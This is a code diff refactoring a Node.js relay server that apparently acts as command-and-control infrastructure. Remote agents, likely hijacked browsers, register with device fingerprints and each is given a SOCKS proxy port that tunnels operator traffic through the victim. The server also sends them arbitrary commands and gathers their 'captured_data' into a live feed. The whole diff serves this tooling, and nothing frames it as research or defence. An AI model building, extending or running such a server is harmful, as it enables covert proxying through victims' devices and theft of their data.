@@ -32,24 +32,24 @@ class RelayServer {
         this.app = express();
         this.server = http.createServer(this.app);
         this.wss = new WebSocket.Server({ server: this.server });
-        this.agents = new Map();
+        this.agents = new Map(); // fingerprint -> agent info
         this.connections = new Map();
-        this.portMap = new Map();
-        this.ipToAgentId = new Map();
+        this.portMap = new Map(); // fingerprint -> port data
+        this.unregisteredAgents = new Map(); // temp ID -> {ws, remoteAddress, timestamp}
         this.portRange = { start: 1081, end: 1181 };
         this.socksServers = new Map();
 
         // Captured data
-        this.capturedData = new Map(); // agentId -> array of captured data
+        this.capturedData = new Map(); // fingerprint -> array of captured data
 
         // Task management
-        this.taskQueues = new Map(); // agentId -> array of tasks
+        this.taskQueues = new Map(); // fingerprint -> array of tasks
         this.tasks = new Map(); // taskId -> task object
         this.taskResults = new Map(); // taskId -> result object
-        
+
         // Server-Sent Events clients
         this.sseClients = new Set(); // Set of SSE response objects
-        
+
         this.setupHealthCheck();
         this.setupControlServer();
         this.setupSocksServer();
@@ -129,63 +129,42 @@ class RelayServer {
 
         // Parse a command from the request body, the request contains:
         // The command object to relay
-        // The IP of the agent to relay the command to
+        // The fingerprint of the agent to relay the command to
         // It will return the taskId of the command
         controlApp.post('/command', (req, res) => {
             try {
-                const { command, payload, agentIp } = req.body;
-                
-                if (!command || !agentIp) {
-                    return res.status(400).json({ 
-                        error: 'Missing required fields: command, agentIp' 
-                    });
-                }
-                
-                // Find agent by IP
-                let targetAgentId = null;
-                for (const [agentId, agent] of this.agents.entries()) {
-                    if (agent.remoteAddress === agentIp) {
-                        targetAgentId = agentId;
-                        break;
-                    }
-                }
-                
-                if (!targetAgentId) {
-                    return res.status(404).json({ 
-                        error: `No active agent found for IP: ${agentIp}` 
+                const { command, payload, fingerprint } = req.body;
+
+                if (!command || !fingerprint) {
+                    return res.status(400).json({
+                        error: 'Missing required fields: command, fingerprint'
                     });
                 }
 
-                const agentPort = this.getPortForAgent(agentIp);
-                let targetAgent = null;
-                for (const [id, agent] of this.agents.entries()) {
-                    if (agent.port === agentPort) {
-                        targetAgent = agent.ws;
-                        break;
-                    }
-                }
+                // Find agent by fingerprint
+                const agent = this.agents.get(fingerprint);
 
-                if (!targetAgent) {
-                    return res.status(503).json({ 
-                        error: `No active agent found for IP: ${agentIp} on port: ${agentPort}` 
+                if (!agent) {
+                    return res.status(404).json({
+                        error: `No active agent found for fingerprint: ${fingerprint}`
                     });
                 }
+
                 // Generate task ID
                 const taskId = crypto.randomUUID();
-                
+
                 // Create task object
                 const task = {
                     taskId,
                     command,
                     payload: payload || {},
-                    agentId: targetAgentId,
-                    agentIp,
+                    fingerprint,
                     status: 'queued',
                     createdAt: new Date().toISOString(),
                     updatedAt: new Date().toISOString()
-                };                
+                };
 
-                targetAgent.send(JSON.stringify({
+                agent.ws.send(JSON.stringify({
                     type: 'command',
                     taskId,
                     command,
@@ -194,43 +173,42 @@ class RelayServer {
 
                 // Store task
                 this.tasks.set(taskId, task);
-                
+
                 // Add to agent's queue
-                if (!this.taskQueues.has(targetAgentId)) {
-                    this.taskQueues.set(targetAgentId, []);
+                if (!this.taskQueues.has(fingerprint)) {
+                    this.taskQueues.set(fingerprint, []);
                 }
-                this.taskQueues.get(targetAgentId).push(task);
-                
+                this.taskQueues.get(fingerprint).push(task);
+
                 // Broadcast task queued via SSE
                 this.broadcastSSE('task_queued', {
                     taskId,
                     command,
-                    agentIp,
+                    fingerprint,
                     status: 'queued'
                 });
-                
+
                 logger.info({
                     event: 'command_queued',
                     taskId,
                     command,
-                    agentId: targetAgentId,
-                    agentIp
+                    fingerprint
                 });
-                
-                res.json({ 
+
+                res.json({
                     taskId,
                     status: 'queued',
                     message: 'Command queued successfully'
                 });
-                
+
             } catch (error) {
                 logger.error({
                     event: 'command_queue_error',
                     error: error.message
                 });
-                
-                res.status(500).json({ 
-                    error: 'Internal server error' 
+
+                res.status(500).json({
+                    error: 'Internal server error'
                 });
             }
         });
@@ -263,13 +241,13 @@ class RelayServer {
                     status: task.status,
                     createdAt: task.createdAt,
                     updatedAt: task.updatedAt,
-                    agentIp: task.agentIp
+                    fingerprint: task.fingerprint
                 };
-                
+
                 if (result) {
                     response.result = result;
                 }
-                
+
                 res.json(response);
                 
             } catch (error) {
@@ -284,52 +262,73 @@ class RelayServer {
             }
         });
         
+        // Connections endpoint - list all active connections
+        controlApp.get('/connections', (req, res) => {
+            const connectionList = [];
+
+            for (const [connectionId, conn] of this.connections.entries()) {
+                const age = Date.now() - conn.createdAt;
+                connectionList.push({
+                    connectionId,
+                    fingerprint: conn.fingerprint,
+                    address: conn.address,
+                    port: conn.port,
+                    ageMs: age,
+                    ageSec: Math.floor(age / 1000),
+                    bytesSent: conn.bytesSent,
+                    bytesReceived: conn.bytesReceived,
+                    socketDestroyed: conn.socket.destroyed
+                });
+            }
+
+            // Sort by age descending (oldest first)
+            connectionList.sort((a, b) => b.ageMs - a.ageMs);
+
+            res.json({
+                totalConnections: connectionList.length,
+                connections: connectionList
+            });
+        });
+
         // Control endpoint
         controlApp.get('/info', (req, res) => {
             const agentInfo = [];
-            const processedIps = new Set();
-            
+            const processedFingerprints = new Set();
+
             // Add active agents
-            for (const [agentId, agent] of this.agents.entries()) {
-                const ip = agent.remoteAddress;
-                processedIps.add(ip);
-                
-                const port = this.getPortForAgent(ip);
+            for (const [fingerprint, agent] of this.agents.entries()) {
+                processedFingerprints.add(fingerprint);
+
                 const connectionCount = Array.from(this.connections.values())
                     .filter(conn => conn.agent === agent.ws).length;
-                
+
                 agentInfo.push({
-                    agentId,
-                    ip,
-                    port,
+                    fingerprint,
+                    ip: agent.remoteAddress,
+                    port: agent.port,
                     active: true,
                     connectionCount,
-                    lastSeen: agent.lastSeen
+                    lastSeen: agent.lastSeen,
+                    platform: agent.fingerprintData?.platform,
+                    userAgent: agent.fingerprintData?.userAgent
                 });
             }
-            
+
             // Add inactive but previously seen agents
-            for (const [ip, portData] of this.portMap.entries()) {
-                // Skip IPs we've already processed (active agents)
-                if (processedIps.has(ip)) {
+            for (const [fingerprint, portData] of this.portMap.entries()) {
+                // Skip fingerprints we've already processed (active agents)
+                if (processedFingerprints.has(fingerprint)) {
                     continue;
                 }
-                
-                // Get the agent ID for this IP if it exists
-                let agentId = "unknown";
-                if (this.ipToAgentId.has(ip)) {
-                    agentId = this.ipToAgentId.get(ip);
-                }
-                
+
                 agentInfo.push({
-                    agentId,
-                    ip,
+                    fingerprint,
                     port: portData.port,
                     active: false,
                     lastSeen: portData.lastSeen
                 });
             }
-            
+
             res.json(agentInfo);
         });
         
@@ -468,66 +467,57 @@ class RelayServer {
                 return;
             }
 
-            // Check if we already have an agent ID for this IP
-            let agentId;
-            let isReconnect = false;
-            
-            if (this.ipToAgentId.has(remoteAddress)) {
-                // Reuse the existing agent ID
-                agentId = this.ipToAgentId.get(remoteAddress);
-                isReconnect = true;
-                
-                // If there's an existing connection with this agent ID, close it
-                const existingAgent = this.agents.get(agentId);
-                if (existingAgent && existingAgent.ws && existingAgent.ws !== ws) {
-                    logger.info({
-                        event: 'replacing_existing_connection',
-                        agentId,
-                        ip: remoteAddress
-                    });
-                    
-                    // Close the existing connection gracefully
-                    try {
-                        existingAgent.ws.close();
-                    } catch (err) {
-                        // Ignore errors when closing
-                    }
-                }
-            } else {
-                // Generate a new agent ID for this IP
-                agentId = crypto.randomUUID();
-                this.ipToAgentId.set(remoteAddress, agentId);
-            }
+            // Generate a temporary ID for this unregistered connection
+            const tempId = crypto.randomUUID();
 
-            const agentInfo = {
+            // Store in unregistered pool waiting for registration message
+            this.unregisteredAgents.set(tempId, {
                 ws,
                 remoteAddress,
-                lastSeen: Date.now(),
-                port: this.getPortForAgent(remoteAddress)
-            };
-            
-            this.agents.set(agentId, agentInfo);
-            
-            this.ensureSocksServerForAgent(agentId, agentInfo);
-            
+                timestamp: Date.now()
+            });
+
             logger.info({
-                event: isReconnect ? 'agent_reconnected' : 'agent_connected',
-                agentId,
+                event: 'agent_connected_unregistered',
+                tempId,
                 ip: remoteAddress,
-                port: agentInfo.port
+                message: 'Waiting for registration message with fingerprint'
             });
 
             ws.on('message', (message) => {
-                if (this.agents.has(agentId)) {
-                    this.agents.get(agentId).lastSeen = Date.now();
-                    
-                    if (this.portMap.has(remoteAddress)) {
-                        this.portMap.get(remoteAddress).lastSeen = Date.now();
-                    }
-                }
-                
                 try {
                     const data = JSON.parse(message.toString());
+
+                    // Handle registration message
+                    if (data.type === 'register') {
+                        this.handleRegistration(tempId, data.fingerprint, ws);
+                        return;
+                    }
+
+                    // Find which agent this message belongs to
+                    let fingerprint = null;
+                    for (const [fp, agent] of this.agents.entries()) {
+                        if (agent.ws === ws) {
+                            fingerprint = fp;
+                            agent.lastSeen = Date.now();
+
+                            if (this.portMap.has(fp)) {
+                                this.portMap.get(fp).lastSeen = Date.now();
+                            }
+                            break;
+                        }
+                    }
+
+                    // If agent not registered yet, ignore non-registration messages
+                    if (!fingerprint) {
+                        logger.warn({
+                            event: 'message_from_unregistered_agent',
+                            type: data.type,
+                            tempId
+                        });
+                        return;
+                    }
+
                     const connection = this.connections.get(data.connectionId);
 
                     if (data.type === 'command_response') {
@@ -540,7 +530,7 @@ class RelayServer {
                         this.broadcastSSE('task_completed', {
                             taskId: data.taskId,
                             command: task ? task.command : 'unknown',
-                            agentIp: task ? task.agentIp : 'unknown',
+                            fingerprint: task ? task.fingerprint : 'unknown',
                             result: data.payload,
                             status: 'completed'
                         });
@@ -552,26 +542,25 @@ class RelayServer {
                         });
                         return;
                     } else if (data.type === 'captured_data') {
-                        if (!this.capturedData.has(agentId)) {
-                            this.capturedData.set(agentId, []);
+                        if (!this.capturedData.has(fingerprint)) {
+                            this.capturedData.set(fingerprint, []);
                         }
-                        this.capturedData.get(agentId).push(data);
-                        
+                        this.capturedData.get(fingerprint).push(data);
+
                         // Get agent info for the SSE event
-                        const agent = this.agents.get(agentId);
-                        
+                        const agent = this.agents.get(fingerprint);
+
                         // Broadcast captured data via SSE
                         this.broadcastSSE('captured_data', {
-                            agentId,
-                            agentIp: agent ? agent.remoteAddress : 'unknown',
+                            fingerprint,
                             data: data.data,
                             dataType: data.dataType,
                             timestamp: new Date().toISOString()
                         });
-                        
+
                         logger.debug({
                             event: 'captured_data',
-                            agentId,
+                            fingerprint,
                             data: data.data,
                             dataType: data.dataType
                         });
@@ -580,16 +569,19 @@ class RelayServer {
 
                     if (connection && data.type === 'data') {
                         const msgId = data.msgId || crypto.randomBytes(4).toString('hex');
+                        const buffer = Buffer.from(data.data, 'base64');
+
+                        connection.bytesReceived += buffer.length;
+
                         logger.debug({
                             event: 'agent_data',
                             connectionId: data.connectionId,
                             msgId,
                             originalMsgId: data.originalMsgId,
-                            dataLength: Buffer.from(data.data, 'base64').length,
-                            dataPreview: Buffer.from(data.data, 'base64').slice(0, 100).toString('hex')
+                            dataLength: buffer.length,
+                            totalReceived: connection.bytesReceived
                         });
-                        
-                        const buffer = Buffer.from(data.data, 'base64');
+
                         try {
                             if (!connection.socket.destroyed) {
                                 connection.socket.write(buffer, (err) => {
@@ -606,7 +598,8 @@ class RelayServer {
                                             event: 'data_sent_succesfully',
                                             connectionId: data.connectionId,
                                             msgId,
-                                            dataLength: buffer.length                                        })
+                                            dataLength: buffer.length
+                                        })
                                     }
                                 });
                             } else {
@@ -627,21 +620,29 @@ class RelayServer {
                     } else if (connection && data.type === 'close') {
                         logger.info({
                             event: 'agent_close_request',
-                            connectionId: data.connectionId
+                            connectionId: data.connectionId,
+                            fingerprint
                         });
                         this.cleanupConnection(data.connectionId);
-                    } else if (!connection && data.type === 'close') {
-                        // Silently ignore close messages for non-existent connections
-                        // This is expected during connection teardown race conditions
+                    } else if (!connection && (data.type === 'close' || data.type === 'data')) {
+                        // Connection already cleaned up - send explicit close to client to stop retries
+                        // This happens when SOCKS client closes before agent finishes sending data
                         logger.debug({
-                            event: 'late_close',
-                            connectionId: data.connectionId
+                            event: data.type === 'close' ? 'late_close' : 'late_data',
+                            connectionId: data.connectionId,
+                            action: 'sending_close_to_stop_retries'
                         });
-                    } else if (!connection && data.type === 'data') {
-                        logger.debug({
-                            event: 'late_data',
-                            connectionId: data.connectionId
-                        });
+
+                        // Find agent and send close message
+                        for (const [fp, agent] of this.agents.entries()) {
+                            if (agent.ws === ws) {
+                                agent.ws.send(JSON.stringify({
+                                    type: 'close',
+                                    connectionId: data.connectionId
+                                }));
+                                break;
+                            }
+                        }
                     } else {
                         logger.warn({
                             event: 'unhandled_message',
@@ -660,29 +661,47 @@ class RelayServer {
             });
 
             ws.on('close', () => {
-                logger.info({
-                    event: 'agent_disconnected',
-                    agentId,
-                    ip: remoteAddress,
-                    port: agentInfo.port
-                });
-                
-                if (this.portMap.has(remoteAddress)) {
-                    this.portMap.get(remoteAddress).lastSeen = Date.now();
-                }
-                
-                // Close all connections for this agent
-                for (const [connectionId, connection] of this.connections.entries()) {
-                    if (connection.agent === ws) {
-                        this.cleanupConnection(connectionId);
+                // Find which fingerprint this WebSocket belongs to
+                let fingerprint = null;
+                for (const [fp, agent] of this.agents.entries()) {
+                    if (agent.ws === ws) {
+                        fingerprint = fp;
+                        break;
                     }
                 }
-                
-                // Remove the agent but keep the IP to agent ID mapping
-                this.agents.delete(agentId);
-                
-                // Note: We intentionally don't remove the IP to agent ID mapping
-                // so that if this IP reconnects, it will get the same agent ID
+
+                if (fingerprint) {
+                    const agent = this.agents.get(fingerprint);
+                    logger.info({
+                        event: 'agent_disconnected',
+                        fingerprint,
+                        ip: remoteAddress,
+                        port: agent.port
+                    });
+
+                    if (this.portMap.has(fingerprint)) {
+                        this.portMap.get(fingerprint).lastSeen = Date.now();
+                    }
+
+                    // Close all connections for this agent
+                    for (const [connectionId, connection] of this.connections.entries()) {
+                        if (connection.agent === ws) {
+                            this.cleanupConnection(connectionId);
+                        }
+                    }
+
+                    // Remove the agent but keep the fingerprint mapping and port allocation
+                    // so that if this fingerprint reconnects, it will get the same port
+                    this.agents.delete(fingerprint);
+                } else {
+                    // Agent never registered, remove from unregistered pool
+                    this.unregisteredAgents.delete(tempId);
+                    logger.info({
+                        event: 'unregistered_agent_disconnected',
+                        tempId,
+                        ip: remoteAddress
+                    });
+                }
             });
             
             const pingInterval = setInterval(() => {
@@ -695,11 +714,15 @@ class RelayServer {
 
             ws.on('pong', () => {
                 ws.isAlive = true;
-                if (this.agents.has(agentId)) {
-                    this.agents.get(agentId).lastSeen = Date.now();
-                    
-                    if (this.portMap.has(remoteAddress)) {
-                        this.portMap.get(remoteAddress).lastSeen = Date.now();
+                // Find which fingerprint this WebSocket belongs to
+                for (const [fingerprint, agent] of this.agents.entries()) {
+                    if (agent.ws === ws) {
+                        agent.lastSeen = Date.now();
+
+                        if (this.portMap.has(fingerprint)) {
+                            this.portMap.get(fingerprint).lastSeen = Date.now();
+                        }
+                        break;
                     }
                 }
             });
@@ -717,76 +740,144 @@ class RelayServer {
         }, 60000);
     }
 
-    getPortForAgent(agentIp) {
-        if (this.portMap.has(agentIp)) {
-            return this.portMap.get(agentIp).port;
+    handleRegistration(tempId, fingerprintData, ws) {
+        const unregistered = this.unregisteredAgents.get(tempId);
+        if (!unregistered) {
+            logger.error({
+                event: 'registration_for_unknown_temp_id',
+                tempId
+            });
+            return;
         }
-        
+
+        const fingerprint = fingerprintData.hash;
+        let isReconnect = false;
+
+        // Check if this fingerprint already exists (reconnection)
+        if (this.agents.has(fingerprint)) {
+            const existingAgent = this.agents.get(fingerprint);
+            isReconnect = true;
+
+            // Close old WebSocket if it's different
+            if (existingAgent.ws && existingAgent.ws !== ws) {
+                logger.info({
+                    event: 'replacing_existing_fingerprint_connection',
+                    fingerprint,
+                    oldIp: existingAgent.remoteAddress,
+                    newIp: unregistered.remoteAddress
+                });
+
+                try {
+                    existingAgent.ws.close();
+                } catch (err) {
+                    // Ignore errors
+                }
+            }
+        }
+
+        // Create/update agent info
+        const agentInfo = {
+            ws,
+            remoteAddress: unregistered.remoteAddress,
+            lastSeen: Date.now(),
+            port: this.getPortForAgent(fingerprint),
+            fingerprintData,
+            registeredAt: Date.now()
+        };
+
+        this.agents.set(fingerprint, agentInfo);
+        this.unregisteredAgents.delete(tempId);
+
+        // Ensure SOCKS server for this agent
+        this.ensureSocksServerForAgent(fingerprint, agentInfo);
+
+        logger.info({
+            event: isReconnect ? 'agent_registered_reconnect' : 'agent_registered',
+            fingerprint,
+            ip: unregistered.remoteAddress,
+            port: agentInfo.port,
+            platform: fingerprintData.platform,
+            userAgent: fingerprintData.userAgent
+        });
+    }
+
+    getPortForAgent(fingerprint) {
+        if (this.portMap.has(fingerprint)) {
+            return this.portMap.get(fingerprint).port;
+        }
+
         const usedPorts = new Set(Array.from(this.portMap.values()).map(data => data.port));
-        
+
         for (let port = this.portRange.start; port <= this.portRange.end; port++) {
             if (!usedPorts.has(port)) {
-                this.portMap.set(agentIp, {
+                this.portMap.set(fingerprint, {
                     port,
                     lastSeen: Date.now()
                 });
                 return port;
             }
         }
-        
+
         logger.error({
             event: 'port_allocation_failed',
-            ip: agentIp,
+            fingerprint,
             message: 'All ports in range are allocated'
         });
-        
+
         return this.portRange.start;
     }
 
-    ensureSocksServerForAgent(agentId, agentInfo) {
+    ensureSocksServerForAgent(fingerprint, agentInfo) {
         const port = agentInfo.port;
-        
+
         if (this.socksServers.has(port)) {
             return;
         }
-        
+
         const socksServer = socks.createServer((info, accept, deny) => {
             const connectionId = crypto.randomUUID();
-            
+
             let targetAgent = null;
-            for (const [id, agent] of this.agents.entries()) {
+            let targetFingerprint = null;
+            for (const [fp, agent] of this.agents.entries()) {
                 if (agent.port === port) {
                     targetAgent = agent.ws;
+                    targetFingerprint = fp;
                     break;
                 }
             }
-            
+
             if (!targetAgent) {
                 logger.error({
                     event: 'no_agent_for_port',
                     port,
                     address: info.dstAddr,
-                    port: info.dstPort
+                    dstPort: info.dstPort
                 });
                 return deny();
             }
 
             const socket = accept(true);
-            
+
             this.connections.set(connectionId, {
                 socket,
                 agent: targetAgent,
+                fingerprint: targetFingerprint,
                 address: info.dstAddr,
                 port: info.dstPort,
-                createdAt: Date.now()
+                createdAt: Date.now(),
+                bytesReceived: 0,
+                bytesSent: 0
             });
 
             logger.info({
                 event: 'new_connection',
                 connectionId,
+                fingerprint: targetFingerprint,
                 address: info.dstAddr,
                 port: info.dstPort,
-                agentPort: port
+                agentPort: port,
+                totalConnections: this.connections.size
             });
 
             targetAgent.send(JSON.stringify({
@@ -799,12 +890,18 @@ class RelayServer {
             socket.on('data', (data) => {
                 const clientMsgId = crypto.randomBytes(4).toString('hex');
                 const buffer = Buffer.from(data);
+
+                const conn = this.connections.get(connectionId);
+                if (conn) {
+                    conn.bytesSent += data.length;
+                }
+
                 logger.debug({
                     event: 'client_data',
                     connectionId,
                     msgId: clientMsgId,
                     dataLength: data.length,
-                    data: data.length > 100 ? data.slice(0, 100).toString('hex') : data.toString('hex')
+                    totalSent: conn ? conn.bytesSent : 0
                 });
                 if (this.connections.has(connectionId)) {
                     targetAgent.send(JSON.stringify({
@@ -817,6 +914,13 @@ class RelayServer {
             });
 
             socket.on('end', () => {
+                logger.info({
+                    event: 'socket_end',
+                    connectionId,
+                    fingerprint: targetFingerprint,
+                    address: info.dstAddr,
+                    port: info.dstPort
+                });
                 targetAgent.send(JSON.stringify({
                     type: 'close',
                     connectionId
@@ -827,6 +931,7 @@ class RelayServer {
                 logger.error({
                     event: 'socket_error',
                     connectionId,
+                    fingerprint: targetFingerprint,
                     error: err.message
                 });
                 targetAgent.send(JSON.stringify({
@@ -855,7 +960,7 @@ class RelayServer {
             logger.info({
                 event: 'socks_server_started',
                 port,
-                agentId
+                fingerprint
             });
             this.socksServers.set(port, socksServer);
         });
@@ -864,9 +969,11 @@ class RelayServer {
     cleanupConnection(connectionId) {
         const connection = this.connections.get(connectionId);
         if (connection) {
+            const age = Date.now() - connection.createdAt;
+
             connection.socket.destroy();
             this.connections.delete(connectionId);
-            
+
             if (connection.agent.readyState === WebSocket.OPEN) {
                 connection.agent.send(JSON.stringify({
                     type: 'close',
@@ -876,7 +983,14 @@ class RelayServer {
 
             logger.info({
                 event: 'connection_closed',
-                connectionId
+                connectionId,
+                fingerprint: connection.fingerprint,
+                address: connection.address,
+                port: connection.port,
+                ageMs: age,
+                bytesSent: connection.bytesSent,
+                bytesReceived: connection.bytesReceived,
+                remainingConnections: this.connections.size
             });
         }
     }
